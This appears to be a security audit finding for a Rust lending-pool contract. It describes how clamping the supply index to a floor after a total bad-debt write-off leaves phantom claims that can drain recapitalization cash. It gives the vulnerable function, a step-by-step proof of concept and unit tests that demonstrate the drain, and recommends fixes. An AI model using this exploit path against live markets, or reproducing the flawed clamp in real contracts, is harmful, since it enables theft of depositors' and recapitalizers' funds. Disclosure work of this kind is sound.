### Title
Bad-debt supply-index floor clamp resurrects wiped-out supply claims that drain recapitalized cash - ([File: contracts/pool/src/interest.rs](contracts/pool/src/interest.rs))

### Summary
CVE-2018-20198 is a NULL-deref crash on a mishandled edge-case path (`LONG_START_SEQUENCE` in `ifilter_bank`), i.e. a failure in a corner of the state machine that produces undefined/invalid output instead of a controlled result. The analog in XOXNO Lending is `apply_bad_debt_to_supply_index`: when a bad-debt write-down exceeds the total supplied value, the function clamps `supply_index` up to `SUPPLY_INDEX_FLOOR_RAW` (`RAY/1000`) rather than zeroing supplier claims. That floor resurrects economically worthless shares as positive claims, and those phantom claims remain withdrawable against any future cash the market receives.

### Finding Description
`apply_bad_debt_to_supply_index` caps the write-down at `total_supplied_value`, computes `reduction_factor = remaining / total`, and then applies `new_supply_index.max(Ray::from(SUPPLY_INDEX_FLOOR_RAW))` [1](#0-0) . When `bad_debt >= total_supplied_value`, the true index should be zero (all supply claims are wiped out), but the clamp forces it to `RAY/1000`, leaving every existing supplier with `scaled_amount * SUPPLY_INDEX_FLOOR_RAW / RAY` of positive floor-valued claim — a phantom claim with zero backing.

This is reachable by any unprivileged address via `clean_bad_debt`, which is permissionless once `total_debt > total_collateral` and collateral ≤ $5 (`BadDebtGate::DustCapped`) [2](#0-1) . The cleanup writes off the account's debt against the market via `apply_bad_debt_to_supply_index`; a sufficiently large debt relative to the market's supplied value drives the index to the floor.

After the wipeout, `require_backed_market` blocks new `supply` while a shortfall exists [3](#0-2) , but `recapitalize` is the documented recovery path and it credits cash to fill the shortfall **without minting shares** (docs/reference/formulas.md: "Recapitalization credits at most that shortfall, refunds excess and mints no shares"). Once cash exists again, the phantom holders can withdraw: withdrawal only runs `require_reserves` (cash sufficiency), not a backing re-check. The pool's own tests demonstrate the drain: `test_raw_cache_floor_clamp_strands_claim_without_supply_guard` shows the stranded supplier withdrawing exactly a fresh depositor's cash, leaving the fresh claim unbacked [4](#0-3) , and `test_raw_cache_floor_residual_can_consume_fresh_cash_without_supply_guard` shows the pool drained to zero [5](#0-4) .

### Impact Explanation
Theft of user funds / protocol insolvency. After a bad-debt wipeout, whoever recapitalizes the market (or any subsequent liquidity event that credits cash) sees that cash claimable by holders whose shares were economically destroyed. The phantom claimant withdraws real tokens that were meant to restore honest backing; the recapitalizer's funds are stolen and the market remains short. This is the same failure shape as the CVE: an unhandled edge of the state machine (total write-down) produces a non-null-but-invalid output (a resurrected index) that downstream consumers treat as real.

### Likelihood Explanation
Requires a market where a single insolvent account's written-off debt meets or exceeds the market's total supplied value — most realistic on thin/small markets or hubs, where `clean_bad_debt`'s $5 dust cap still permits debt larger than a tiny supply base. An attacker can also deliberately construct the state: supply a small amount, build an underwater dust-collateral position on the same market via a price move, then call `clean_bad_debt`. The attacker profits only if they hold (or acquire cheaply) pre-wipeout supply shares and someone later recapitalizes or the market otherwise gains cash — the protocol's own recovery procedure is the funding source. Medium likelihood, Medium-High impact.

### Recommendation
When `bad_debt >= total_supplied_value`, zero out supplier claims explicitly instead of clamping the index — e.g., remove the floor clamp for the full-wipeout case and record a `market_wiped` flag that forces `unscale_supply_*` to return 0 for pre-existing shares, or distribute a proportional haircut via a separate reset mechanism. At minimum, `withdraw`/`claim_revenue` should re-check `backing_shortfall` (not just `require_reserves`) after a socialization event so that phantom residual claims cannot withdraw recapitalized cash before genuine backing is restored.

### Proof of Concept
1. On a thin market `(hub, X)`, attacker supplies a small amount `S`, obtains `scaled_a` shares.
2. A dust-collateral account (created by the attacker or pre-existing) holds debt `D` in market `X` and ≤$5 collateral; a price move makes `D > C` and `D` (in RAY at `borrow_index`) ≥ `supplied * supply_index`.
3. Attacker calls `controller.clean_bad_debt(account_id)` — permissionless under `BadDebtGate::DustCapped`. `apply_bad_debt_to_supply_index` clamps `supply_index` to `SUPPLY_INDEX_FLOOR_RAW`; attacker's `scaled_a` now has a positive floor claim with zero backing.
4. `supply` is blocked by `require_backed_market`; a recapitalizer calls `recapitalize`, crediting cash `C` without minting shares.
5. Attacker calls `controller.withdraw(account, [(hubX, i128::MAX)])`; `resolve_withdrawal` pays out the phantom claim against `C`, `require_reserves` passes since cash ≥ gross. The pool's cash is drained to (near) zero while the recapitalizer's credited amount is gone — replicating `contracts/pool/tests/interest.rs::test_raw_cache_floor_residual_can_consume_fresh_cash_without_supply_guard` end-to-end.

pub(crate) fn apply_bad_debt_to_supply_index(cache: &mut Cache, bad_debt: Ray) {
    let total_supplied_value = cache.supplied().mul(cache.env(), cache.supply_index());

    if total_supplied_value == Ray::ZERO {
        return;
    }

    let capped = bad_debt.min(total_supplied_value);
    let remaining = total_supplied_value.checked_sub(cache.env(), capped);

    let reduction_factor = remaining.div_floor(cache.env(), total_supplied_value);
    let new_supply_index = cache
        .supply_index()
        .mul_floor(cache.env(), reduction_factor);

    cache.set_supply_index(new_supply_index.max(Ray::from(SUPPLY_INDEX_FLOOR_RAW)));
}

enum BadDebtGate {

    DustCapped,

/// Requires open debt and the selected insolvency gate, then cleans up the account.
fn socialize_bad_debt(env: &Env, account_id: u64, gate: BadDebtGate) {
    let mut cache = Context::new(env);
    let account = storage::get_account(env, account_id);

    assert_with_error!(
        env,
        !account.borrow_positions.is_empty(),
        CollateralError::DebtPositionNotFound
    );

    let totals = risk::calculate_account_risk_totals(
        env,
        &mut cache,
        &account.supply_positions,
        &account.borrow_positions,
    );

    let admits = match gate {
        BadDebtGate::DustCapped => {
            is_socializable_bad_debt(totals.total_debt, totals.total_collateral)
        }
        BadDebtGate::InsolventOnly => totals.total_debt > totals.total_collateral,
    };
    assert_with_error!(env, admits, CollateralError::CannotCleanBadDebt);

    bad_debt::execute_bad_debt_cleanup(env, &mut cache, account_id, &account, &totals);

fn test_raw_cache_floor_residual_can_consume_fresh_cash_without_supply_guard() {
    let t = TestSetup::new();
    t.as_contract(|| {
        let scaled_a_raw = 1_000_000 * RAY;
        let mut cache = t.fresh_cache(PoolStateRaw {
            supplied: scaled_a_raw,
            borrowed: 0,
            revenue: 0,
            borrow_index: RAY,
            supply_index: RAY,
            last_timestamp: 0,
            cash: 0,
        });
        let scaled_a = Ray::from(scaled_a_raw);

        apply_bad_debt_to_supply_index(&mut cache, Ray::from(2_000_000 * RAY));
        assert_eq!(
            cache.supply_index().raw(),
            SUPPLY_INDEX_FLOOR_RAW,
            "wipeout must clamp supply index UP to the floor, not reset the base"
        );

        let stranded = cache.unscale_supply_floor(scaled_a);
        assert!(stranded > 0, "floor clamp leaves userA a phantom claim");
        assert_eq!(cache.cash(), 0, "empty market: no cash to extract yet");

        let c = stranded;
        let scaled_b = cache.calculate_scaled_supply(c);
        cache.mint_supply(scaled_b);
        cache.credit_cash(c);

        let b_claim = cache.unscale_supply_floor(scaled_b);
        assert_eq!(b_claim, c, "userB's honest claim equals their deposit");

        let (burn, gross) = cache.resolve_withdrawal(i128::MAX, scaled_a);
        cache.require_reserves(gross);
        cache.burn_supply(burn);
        cache.debit_cash(gross);

        assert!(gross > 0, "stranded position pays out non-zero");
        assert_eq!(
            gross, c,
            "userA drains exactly userB's fresh deposit out of the pool"
        );

        assert!(
            cache.cash() < b_claim,
            "pool cash ({}) can no longer cover userB's claim ({}): honest supplier lost funds",
            cache.cash(),
            b_claim
        );
        assert_eq!(cache.cash(), 0, "userA drained the pool to empty");
    });
}

fn test_raw_cache_floor_clamp_strands_claim_without_supply_guard() {
    let t = TestSetup::new();
    t.as_contract(|| {
        let old_scaled_raw = 1_000 * RAY;
        let mut cache = t.fresh_cache(PoolStateRaw {
            supplied: old_scaled_raw,
            borrowed: 0,
            revenue: 0,
            borrow_index: RAY,
            supply_index: RAY,
            last_timestamp: 0,
            cash: 0,
        });
        let old_scaled = Ray::from(old_scaled_raw);

        apply_bad_debt_to_supply_index(&mut cache, Ray::from(5_000 * RAY));
        assert_eq!(
            cache.supply_index().raw(),
            SUPPLY_INDEX_FLOOR_RAW,
            "wipeout clamps supply_index UP to RAY/1000 instead of resetting shares to 0",
        );

        let stranded = cache.unscale_supply_floor(old_scaled);
        assert!(stranded > 0, "floor clamp leaves S_old a phantom claim");
        assert_eq!(
            cache.cash(),
            0,
            "no cash yet: invariant only masked by require_reserves"
        );

        let fresh_cash = stranded;
        let fresh_scaled = cache.calculate_scaled_supply(fresh_cash);
        cache.mint_supply(fresh_scaled);
        cache.credit_cash(fresh_cash);

        let fresh_claim = cache.unscale_supply_floor(fresh_scaled);
        assert_eq!(
            fresh_claim, fresh_cash,
            "fresh supplier's claim equals deposit"
        );

        let (burn, gross) = cache.resolve_withdrawal(i128::MAX, old_scaled);
        cache.require_reserves(gross);
        cache.burn_supply(burn);
        cache.debit_cash(gross);

        assert!(gross > 0, "stranded wiped position pays out real tokens");
        assert_eq!(gross, fresh_cash, "S_old drains exactly the fresh deposit");
        assert!(
            cache.cash() < fresh_claim,
            "pool cash ({}) can no longer cover fresh supplier claim ({}): funds lost",
            cache.cash(),
            fresh_claim,
        );
    });
